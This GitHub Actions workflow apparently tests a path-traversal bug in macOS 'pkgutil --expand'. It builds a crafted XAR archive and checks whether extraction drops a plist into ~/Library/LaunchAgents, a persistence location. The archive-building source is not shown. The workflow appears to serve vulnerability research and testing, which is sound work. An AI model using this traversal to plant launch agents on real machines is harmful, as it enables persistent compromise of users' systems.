name: gate_b_run42
on:
  workflow_dispatch:
jobs:
  gate_b:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - name: GATE B - pkgutil LaunchAgents traversal (run42)
        shell: bash
        run: |
          LOG="/tmp/run42_gate_b.log"
          echo "=== GATE B run42 PRE-CHECK ===" | tee "$LOG"
          [ -f /Users/runner/Library/LaunchAgents/xar_gate_b.plist ] \
            && echo "PRE_PLIST=PRESENT" | tee -a "$LOG" \
            || echo "PRE_PLIST=ABSENT"  | tee -a "$LOG"

          cc -O2 -Wno-nullability-completeness -o build_xar_r41 build_xar_r41.c -lz 2>&1 | tee -a "$LOG"
          mkdir -p /tmp/r42_xar
          ./build_xar_r41 /tmp/r42_xar/gate_b.xar 2>&1 | tee -a "$LOG"

          # pkgutil creates OUTDIR itself — do NOT mkdir it first
          TMPBASE=$(mktemp -d /tmp/gate_b42_pkgutil.XXXXXX)
          OUTDIR="$TMPBASE/out"
          echo "OUTDIR: $OUTDIR" | tee -a "$LOG"
          echo "Expected: $OUTDIR/../../../../../../Users/runner/Library/LaunchAgents/xar_gate_b.plist" | tee -a "$LOG"

          # ensure destination dir exists
          mkdir -p /Users/runner/Library/LaunchAgents

          pkgutil --expand /tmp/r42_xar/gate_b.xar "$OUTDIR" 2>&1 | tee -a "$LOG" || true
          echo "pkgutil exit: $?" | tee -a "$LOG"

          echo "=== LaunchAgents dir ===" | tee -a "$LOG"
          ls -la /Users/runner/Library/LaunchAgents/ | tee -a "$LOG"

          echo "=== GATE B CHECK ===" | tee -a "$LOG"
          if [ -f /Users/runner/Library/LaunchAgents/xar_gate_b.plist ]; then
            echo "GATE_B_PKGUTIL=PASS" | tee -a "$LOG"
            cat /Users/runner/Library/LaunchAgents/xar_gate_b.plist | tee -a "$LOG"
          else
            echo "GATE_B_PKGUTIL=FAIL" | tee -a "$LOG"
            exit 1
          fi

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: run42-gate-b-results
          path: /tmp/run42_gate_b.log
